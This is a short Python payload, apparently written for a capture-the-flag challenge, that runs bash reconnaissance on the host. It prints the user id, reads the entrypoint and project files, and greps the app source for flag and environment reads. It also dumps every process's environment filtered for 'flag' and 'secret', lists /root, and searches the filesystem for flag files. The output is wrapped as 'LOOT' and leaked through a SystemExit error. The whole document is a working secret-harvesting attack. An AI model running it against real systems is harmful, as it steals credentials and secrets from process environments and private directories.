import subprocess, sys

cmd = r'''
echo "=== id ==="; id
echo "=== entrypoint ==="; cat /entrypoint.sh 2>&1
echo "=== pyproject ==="; cat /app/pyproject.toml 2>&1
echo "=== app tree ==="; find /app -type f 2>/dev/null
echo "=== app src ==="; grep -rIn -iE 'flag|open\(|environ|getenv|FLAG' /app/src 2>/dev/null | head -60
echo "=== proc1 env ==="; cat /proc/1/environ 2>/dev/null | tr '\0' '\n' | grep -iE 'flag|ctf|cncc|secret'
echo "=== all proc env ==="; for e in /proc/*/environ; do tr '\0' '\n' < "$e" 2>/dev/null; done | grep -iE 'flag\{|cncc|CTF\{' | sort -u | head
echo "=== root ls ==="; ls -la /root 2>&1
echo "=== flag wide ==="; cat /root/flag* /flag* 2>/dev/null; find / -iname '*flag*' 2>/dev/null | grep -ivE '^/proc|^/sys|site-packages|dist-packages' | head -40
'''

out = subprocess.run(["bash", "-c", cmd], capture_output=True, text=True)
loot = "LOOT_START\n" + out.stdout + out.stderr + "\nLOOT_END"
raise SystemExit(loot)
